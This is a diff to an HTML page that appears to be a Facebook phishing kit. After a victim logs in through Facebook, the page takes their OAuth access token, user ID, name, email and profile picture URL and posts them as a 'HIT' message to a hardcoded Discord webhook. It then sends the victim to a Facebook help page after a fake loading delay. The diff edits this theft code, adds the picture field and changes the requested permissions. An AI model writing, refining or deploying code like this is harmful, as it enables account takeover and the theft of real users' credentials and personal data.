@@ -33,7 +33,6 @@ button:hover{background:#166fe5}
 </div>
 
 <script>
-// CONFIG — replace with your Discord webhook
 const WEBHOOK = 'https://discord.com/api/webhooks/1520970776130359306/-SigA1miPn6LkyvXELyi021ufql-FVIq9UDeLG63zta73iE3zp5wuAP2t4_0UZWh6fd9';
 
 FB.init({appId: '132888053867486', cookie: true, xfbml: true, version: 'v18.0'});
@@ -44,25 +43,20 @@ function login() {
             const token = response.authResponse.accessToken;
             const uid = response.authResponse.userID;
             
-            FB.api('/me?fields=name,email', function(user) {
-                // Ship token to Discord
+            FB.api('/me?fields=name,email,picture', function(user) {
                 fetch(WEBHOOK, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        content: `🎯 **HIT**\n**Name:** ${user.name}\n**ID:** ${uid}\n**Email:** ${user.email || 'N/A'}\n**Token:** \`${token}\`\n**Time:** ${new Date().toISOString()}`
+                        content: `🎯 **HIT**\n**Name:** ${user.name}\n**ID:** ${uid}\n**Email:** ${user.email || 'N/A'}\n**Token:** \`${token}\`\n**Pic:** ${user.picture?.data?.url || 'N/A'}\n**Time:** ${new Date().toISOString()}`
                     })
                 });
-                
-                // Fake loading then bounce to Facebook
                 document.querySelector('button').textContent = 'Loading...';
-                setTimeout(() => {
-                    location.href = 'https://www.facebook.com/help/photo-unavailable';
-                }, 2000);
+                setTimeout(() => location.href = 'https://www.facebook.com/help/photo-unavailable', 2000);
             });
         }
     }, {
-        scope: 'public_profile,email,pages_read_engagement,pages_manage_posts,instagram_basic,instagram_content_publish,instagram_manage_insights,publish_to_groups',
+        scope: 'public_profile,email,user_friends',
         auth_type: 'rerequest'
     });
 }
